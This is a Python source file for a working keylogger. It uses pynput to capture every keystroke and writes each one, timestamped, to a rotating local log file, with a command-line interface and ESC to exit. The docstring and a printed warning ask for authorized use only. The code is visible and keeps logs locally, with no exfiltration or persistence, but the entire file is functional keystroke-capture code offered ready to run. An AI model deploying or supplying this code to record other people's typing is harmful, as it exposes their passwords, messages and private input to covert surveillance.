"""Simple keylogger using pynput with improved logging and CLI.

Notes: Use responsibly and only with permission. Keyloggers can be used
for malicious purposes; ensure you comply with local laws and policies.
"""

import argparse
import logging
import logging.handlers
import os
import sys
from datetime import datetime

from pynput import keyboard


DEFAULT_LOG_FILE = os.path.join(os.path.dirname(__file__), "recorded text", "keylog.txt")


def format_key(key) -> str:

    try:
        return key.char
    except AttributeError:
        if key == keyboard.Key.space:
            return "[SPACE]"
        elif key == keyboard.Key.enter:
            return "[ENTER]"
        elif key == keyboard.Key.backspace:
            return "[BACKSPACE]"
        else:
            
            return f"[{str(key)}]"


def setup_logger(log_file: str, max_bytes: int = 10 * 1024 * 1024, backups: int = 3, level=logging.INFO):

    logger = logging.getLogger("keylogger")
    logger.setLevel(level)


    log_dir = os.path.dirname(os.path.abspath(log_file)) or os.getcwd()
    os.makedirs(log_dir, exist_ok=True)


    abs_log_file = os.path.abspath(log_file)
    for h in logger.handlers:
        base = getattr(h, "baseFilename", None)
        if base and os.path.abspath(base) == abs_log_file:
            return logger

    handler = logging.handlers.RotatingFileHandler(
        log_file, maxBytes=max_bytes, backupCount=backups, encoding="utf-8"
    )
    fmt = logging.Formatter("[%(asctime)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    handler.setFormatter(fmt)
    logger.addHandler(handler)

    
    if sys.stdout.isatty():
        sh = logging.StreamHandler()
        sh.setFormatter(fmt)
        logger.addHandler(sh)

    
    try:

        logger.debug("Creating log file for permission enforcement")
        handler.stream.flush()
        if os.path.exists(abs_log_file):
            os.chmod(abs_log_file, 0o600)
    except Exception:

        logger.debug("Failed to set secure permissions on %s", abs_log_file)

    return logger


def write_to_log(logger: logging.Logger, key):
    msg = format_key(key)
    logger.info(msg)


def on_press(logger: logging.Logger):
    def _on_press(key):
        write_to_log(logger, key)

    return _on_press


def on_release():
    def _on_release(key):

        if key == keyboard.Key.esc:
            print("Exiting key listener...")
            return False

    return _on_release


def parse_args(argv=None):
    p = argparse.ArgumentParser(description="Simple keylogger using pynput")
    p.add_argument("--logfile", "-o", default=DEFAULT_LOG_FILE, help="Path to the log file")
    p.add_argument("--max-bytes", type=int, default=10 * 1024 * 1024, help="Max bytes per log file before rotation")
    p.add_argument("--backups", type=int, default=3, help="Number of rotated backup files to keep")
    p.add_argument("--debug", action="store_true", help="Enable debug logging to stderr")
    return p.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    logfile = os.path.expanduser(args.logfile)

    # If the user provided only a filename or './name', place it inside our
    # `recorded text` directory so logs stay organized there by default.
    dir_part = os.path.dirname(logfile)
    if not os.path.isabs(logfile) and (dir_part == "" or dir_part == "."):
        default_dir = os.path.join(os.path.dirname(__file__), "recorded text")
        os.makedirs(default_dir, exist_ok=True)
        logfile = os.path.join(default_dir, os.path.basename(logfile))

    try:
        logger = setup_logger(logfile, max_bytes=args.max_bytes, backups=args.backups,
                              level=logging.DEBUG if args.debug else logging.INFO)
    except OSError as e:
        print(f"Failed to open log file {logfile}: {e}", file=sys.stderr)
        return 1


    print("Warning: run this only with proper authorization. Press ESC to exit.")
    print(f"Logging to: {logfile}")

    listener = keyboard.Listener(on_press=on_press(logger), on_release=on_release())
    try:
        listener.start()
        listener.join()
    except KeyboardInterrupt:
        print("Interrupted by user, stopping...")
    except Exception as exc:
        logger.exception("Unhandled exception in key listener: %s", exc)
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
